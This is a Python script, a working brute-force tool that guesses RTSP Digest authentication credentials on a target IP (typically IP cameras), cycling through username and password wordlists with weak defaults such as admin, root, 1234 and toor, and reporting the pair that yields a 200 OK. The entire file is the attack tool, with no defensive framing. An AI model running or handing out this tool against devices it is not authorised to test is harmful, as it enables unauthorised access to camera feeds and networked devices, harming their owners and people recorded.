import socket
import hashlib
import argparse
import time
import os

def send_rtsp_request(ip, port, path, method="OPTIONS", headers=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        cseq = "1"
        request = f"{method} rtsp://{ip}:{port}/{path} RTSP/1.0\r\nCSeq: {cseq}\r\n"
        if headers:
            for k, v in headers.items():
                request += f"{k}: {v}\r\n"
        request += "\r\n"
        s.send(request.encode())

        data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    break
            except socket.timeout:
                break
        s.close()
        return data.decode(errors="ignore")

    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"[!] Connection reset by peer ({e}). Skipping this attempt.")
        return ""
    except socket.timeout:
        print("[!] Socket timed out.")
        return ""
    except Exception as e:
        print(f"[!] Socket error: {e}")
        return ""

def parse_digest_challenge(response):
    for line in response.split("\r\n"):
        if line.lower().startswith("www-authenticate:"):
            line = line.split("Digest")[1]
            parts = {}
            for item in line.split(","):
                if "=" in item:
                    k, v = item.strip().split("=", 1)
                    parts[k.strip()] = v.strip('"')
            return parts
    return None

def compute_digest(username, password, realm, nonce, method, uri):
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    return response

def load_wordlist(path, fallback):
    if path and os.path.isfile(path):
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return fallback

def main():
    parser = argparse.ArgumentParser(description="RTSP Digest Auth Brute-Forcer")
    parser.add_argument("ip", help="Target IP")
    parser.add_argument("path", help="RTSP path (e.g. Streaming/Channels/1)")
    parser.add_argument("-p", "--port", type=int, default=554, help="RTSP port (default: 554)")
    parser.add_argument("-U", "--userlist", help="Path to username wordlist")
    parser.add_argument("-P", "--passlist", help="Path to password wordlist")
    parser.add_argument("-t", "--throttle", type=float, default=0.0, help="Throttle (delay) between attempts in seconds")
    args = parser.parse_args()

    usernames = load_wordlist(args.userlist, ["admin", "user", "root"])
    passwords = load_wordlist(args.passlist, ["admin", "1234", "password", "toor"])

    uri = f"/{args.path}"
    print(f"[*] Connecting to rtsp://{args.ip}:{args.port}{uri}")
    response = send_rtsp_request(args.ip, args.port, args.path, "OPTIONS")
    if "401 Unauthorized" not in response or "WWW-Authenticate" not in response:
        print("[-] No Digest authentication challenge received. Exiting.")
        return

    auth = parse_digest_challenge(response)
    if not auth:
        print("[-] Failed to parse WWW-Authenticate header.")
        return

    realm = auth["realm"]
    nonce = auth["nonce"]

    print("[*] Starting brute-force...")
    for username in usernames:
        for password in passwords:
            digest = compute_digest(username, password, realm, nonce, "DESCRIBE", uri)
            auth_header = (
                f'Digest username="{username}", realm="{realm}", nonce="{nonce}", '
                f'uri="{uri}", response="{digest}", algorithm=MD5'
            )
            headers = {"Authorization": auth_header}

            resp = send_rtsp_request(args.ip, args.port, args.path, "DESCRIBE", headers)
            print(f"[*] Tried {username}:{password} - Response Length: {len(resp)}")

            if "200 OK" in resp:
                print(f"[+] SUCCESS: {username}:{password}")
                return

            if args.throttle > 0:
                time.sleep(args.throttle)

    print("[-] Brute-force complete. No valid credentials found.")

if __name__ == "__main__":
    main()
